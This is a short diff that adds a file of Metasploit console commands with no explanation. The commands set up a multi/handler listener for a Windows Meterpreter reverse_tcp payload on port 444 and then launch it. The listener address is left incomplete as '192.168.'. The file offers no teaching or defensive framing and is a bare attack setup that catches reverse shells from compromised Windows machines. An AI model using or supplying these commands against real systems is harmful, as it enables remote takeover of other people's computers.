@@ -1,0 +1,7 @@
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.
+set LPORT 444
+exploit
